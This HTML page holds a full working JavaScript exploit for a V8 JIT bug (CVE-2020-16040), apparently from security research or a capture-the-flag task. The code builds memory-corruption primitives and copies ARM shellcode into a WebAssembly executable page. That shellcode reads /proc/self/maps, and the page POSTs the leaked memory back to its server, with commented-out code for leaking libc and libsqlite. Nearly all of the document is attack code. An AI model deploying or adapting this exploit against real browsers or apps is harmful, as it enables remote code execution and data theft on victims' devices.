<!DOCTYPE html>
<html>
    <head>
<script>

// Reference: https://faraz.faith/2021-01-07-cve-2020-16040-analysis/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x1000);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function foo(a) {
  var y = 0x7fffffff;

  if (a == NaN) y = NaN;
  if (a) y = -1;

  let z = y + 1;
  z >>= 31;
  z = 0x80000000 - Math.sign(z|1);

  if(a) z = 0;

  var arr = new Array(0-Math.sign(z));
  arr.shift();
  var cor = [1.1, 1.2, 1.3];

  return [arr, cor];
}

for(var i=0;i<0x3000;++i)
    foo(true);

var x = foo(false);
var arr = x[0];
var cor = x[1];

const idx = 6;
arr[idx+10] = 0x4242;

function addrof(k) {
    arr[idx+1] = k;
    return ftoi(cor[0]) & 0xffffffffn;
}

function fakeobj(k) {
    cor[0] = itof(k);
    return arr[idx+1];
}

var float_array_map = ftoi(cor[3]);

var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
var fake = fakeobj(addrof(arr2) + 0x20n);

function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return (fake[0]);
}

function arbwrite(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}

function w32(addr, val) {
    let new_addr = BigInt(addr) & 0xfffffffffffffffcn;
    let old_val = ftoi(arbread(new_addr));
    let new_val = 0n;
    if (new_addr % 8n == 4n) {
        new_val = (old_val & 0x00000000ffffffffn) + (BigInt(val) << 32n);
    } else {
        new_val = (old_val & 0xffffffff00000000n) + BigInt(val);
    }
    arbwrite(new_addr, new_val);
}

function copy_shellcode(addr, shellcode) {
    let dataview = new DataView(buf2);
    let buf_addr = addrof(buf2);
    let backing_store_addr = buf_addr + 0x10n;
    //arbwrite(backing_store_addr, addr);
    w32(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
        //if (i < 0x20) {
                //print(dataview.getUint8(i).toString(16));
        //}
        dataview.setUint8(i, shellcode[i]);
    }
}

function send_result(path, body) {
    fetch('/' + path, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
        },
        body: body
    })
    .then(response => response.text())
    .then(data => {
        console.log('Response from server:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

function call_read(seek_pos) {
    let dataview = new DataView(buf2);

    dataview.setUint32(1024, seek_pos, true);
    let read_len = f();
    print("read: " + result_to_u32(read_len).toString());
    if (read_len > 2048) {
        read_len = 2048;
    }

    let numbers = [];
    for (let i = 2048; i < 2048 + read_len; i++) {
        numbers.push(dataview.getUint8(i));
    }
    fetch('/' + seek_pos.toString(), {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
        },
        body: numbers.toString()
    })
    .then(response => response.text())
    .then(data => {
        console.log('Response from server:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });

    return read_len;
}

function result_to_u32(result) {
    if (result < 0) {
        return 0x100000000 + result;
    } else {
        return result;
    }
}

function set_buf_ptr(buf, addr) {
    let buf_addr = addrof(buf);
    w32(buf_addr + 0x10n, BigInt(addr));
    print("corrupted buffer");
}

function get_proc_maps() {
    copy_shellcode(rwx_page_addr, shellcode);
    print("shellcode written");
    let mmap_addr = result_to_u32(f());
    print("mmap addr: " + mmap_addr.toString(16));

    let mmap_buf = new ArrayBuffer(4096);
    let view = new DataView(mmap_buf);

    let out = "";
    for (let i = 0; i < 2; i++) {
        let page_addr = mmap_addr + i * 4096;
        set_buf_ptr(mmap_buf, page_addr);
        print("corrupted buffer");

        for (let i = 0; i < 4096; i++) {
            let n = view.getUint8(i);
            if (n == 0) {
                continue;
            }
            out += String.fromCharCode(n);
        }
    }

    send_result('maps', out);
}

let log_text = '';

function print(value) {
  log_text += ('\n' + value);
}

var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x40n)) & 0xffffffffn;
console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
print("[+] Address of rwx page: " + rwx_page_addr.toString(16));
//var shellcode = [16889928,16843009,1213202689,1652108984,23227744,70338561,800606244,796029813,1349413218,1760004424,16855099,19149953,1208025345,1397310648,1497451600,3526447165,1510500946,1390543176,1222805832,16843192,16843009,3091746817,1617066286,16867949,604254536,1966061640,1647276659,827354729,141186806,3858843742,3867756630,257440618,2425393157];
//var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];  // windows shellcode
var shellcode = [0x10, 0xd0, 0x4d, 0xe2, 0x0, 0x80, 0x8d, 0xe5, 0x4, 0x90, 0x8d, 0xe5, 0x8, 0xa0, 0x8d, 0xe5, 0xc, 0xb0, 0x8d, 0xe5, 0xd, 0xa0, 0xa0, 0xe1, 0x0, 0x0, 0xa0, 0xe3, 0x1, 0x17, 0xa0, 0xe3, 0x3, 0x20, 0xa0, 0xe3, 0x22, 0x30, 0xa0, 0xe3, 0x0, 0x40, 0xe0, 0xe3, 0x0, 0x50, 0xa0, 0xe3, 0xc0, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x0, 0x80, 0xa0, 0xe1, 0x10, 0xd0, 0x4d, 0xe2, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0x0, 0x0, 0x8d, 0xe5, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0x4, 0x0, 0x8d, 0xe5, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0x8, 0x0, 0x8d, 0xe5, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0xc, 0x0, 0x8d, 0xe5, 0x10, 0xd0, 0x4d, 0xe2, 0x2f, 0x0, 0x7, 0xe3, 0x72, 0xf, 0x46, 0xe3, 0x0, 0x0, 0x8d, 0xe5, 0x63, 0xf, 0x2, 0xe3, 0x73, 0x5, 0x46, 0xe3, 0x4, 0x0, 0x8d, 0xe5, 0x6c, 0x6, 0x6, 0xe3, 0x2f, 0xd, 0x46, 0xe3, 0x8, 0x0, 0x8d, 0xe5, 0x61, 0x0, 0x7, 0xe3, 0x73, 0x0, 0x40, 0xe3, 0xc, 0x0, 0x8d, 0xe5, 0xd, 0x0, 0xa0, 0xe1, 0x0, 0x10, 0xa0, 0xe3, 0x5, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x0, 0x90, 0xa0, 0xe1, 0x0, 0xb0, 0xa0, 0xe3, 0x9, 0x0, 0xa0, 0xe1, 0xb, 0x10, 0x88, 0xe0, 0x1, 0x27, 0xa0, 0xe3, 0xb, 0x20, 0x42, 0xe0, 0x3, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x0, 0x10, 0xa0, 0xe3, 0x1, 0x0, 0x50, 0xe1, 0x1, 0x0, 0x0, 0xa, 0x0, 0xb0, 0x8b, 0xe0, 0xf4, 0xff, 0xff, 0xea, 0x8, 0x0, 0xa0, 0xe1, 0xa, 0xd0, 0xa0, 0xe1, 0x0, 0x80, 0x9d, 0xe5, 0x4, 0x90, 0x9d, 0xe5, 0x8, 0xa0, 0x9d, 0xe5, 0xc, 0xb0, 0x9d, 0xe5, 0x10, 0xd0, 0x8d, 0xe2, 0x1e, 0xff, 0x2f, 0xe1];
// trigger jit for wasm
for (let i = 0; i < 100000; i++) {
    f();
}
//copy_shellcode(rwx_page_addr, shellcode);

get_proc_maps();

//let read_index = 0;
/*while (true) {
    let read_len = call_read(read_index);
    read_index += read_len;
    if (read_len == 0) {
        break;
    }
}*/
// adjust seek offsets to leak libc.so and libsqlite.so
// libsqlite.so
//call_read(138500 - 1024);

</script>
</head>
    <body>
<h1> Remotely executing the calculator </h1>
<p id="log"></p>
    </body>
</html>
<script>
  document.getElementById('log').textContent = log_text;
</script>
